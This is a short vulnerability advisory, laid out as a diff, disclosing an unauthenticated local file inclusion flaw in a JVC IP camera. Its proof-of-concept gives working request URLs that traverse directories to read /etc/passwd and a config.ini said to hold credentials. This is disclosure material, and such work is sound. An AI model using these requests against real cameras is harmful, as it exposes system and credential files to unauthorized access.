@@ -1,0 +1,35 @@
+1. Advisory Information
+========================================
+Title                   : JVC IP-Camera (VN-T216VPRU) Local File Inclusion
+Vendor Homepage         : http://pro.jvc.com/
+Remotely Exploitable	: Yes
+Tested on Camera types	: VN-T216VPRU
+Product References      : http://pro.jvc.com/prof/attributes/features.jsp?model_id=MDL102145
+Vulnerability           : Local File Inclusion (Critical/High)
+Date                    : 20/08/2016
+Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
+
+
+2. CREDIT
+========================================
+This vulnerability was identified during penetration test by Yakir Wizman.
+
+
+3. Description
+========================================
+JVC IP-Camera (VN-T216VPRU) allows to unauthenticated user to include files from local server such as /etc/passwd, /etc/shadow or config.ini which contains all credentials and other configurations.
+
+
+4. Proof-of-Concept:
+========================================
+For example you can get /etc/passwd
+http://host:port/cgi-bin/check.cgi?file=../../../etc/passwd
+
+Or config.ini file:
+
+http://host:port/cgi-bin/check.cgi?file=config.ini
+
+
+5. SOLUTION
+========================================
+Contact the vendor for further information regarding the proper mitigation of this vulnerability.
